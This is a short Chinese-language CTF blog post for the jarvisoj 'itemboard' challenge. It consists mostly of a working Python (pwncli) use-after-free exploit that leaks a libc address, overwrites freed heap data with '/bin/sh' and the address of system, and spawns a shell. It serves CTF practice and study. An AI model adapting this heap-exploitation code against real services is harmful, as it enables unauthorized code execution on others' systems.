# jarvisoj_itemboard



### 总结

基础的`UAF`的题，只记录下`exp`吧。

<!-- more -->

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def new(name, length, desc):
    p.sendlineafter("choose:", "1")
    p.sendlineafter("Item name?\n", name)
    p.sendlineafter("Description's len?\n", str(length))
    p.sendlineafter("Description?\n", desc)


def show(idx):
    p.sendlineafter("choose:", "3")
    p.sendlineafter("Which item?\n", str(idx))
    return p.recvlines(3)

def remove(idx):
    p.sendlineafter("choose:", "4")
    p.sendlineafter("Which item?\n", str(idx))

new("lynne", 0x80, "lynne")
new("lynne", 0x20, "lynne")
remove(0)

_, _1, leak_addr = show(0)
libc_base_addr = u64(leak_addr[-6:].ljust(8, b"\x00")) - 0x3c4b78

remove(1)

new("aaaaa", 0x18, b"/bin/sh;" + b"a" * 8 + p64(libc_base_addr + libc.sym['system'])[:-1])

remove(0)

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-21-jarvisoj-itemboard/  

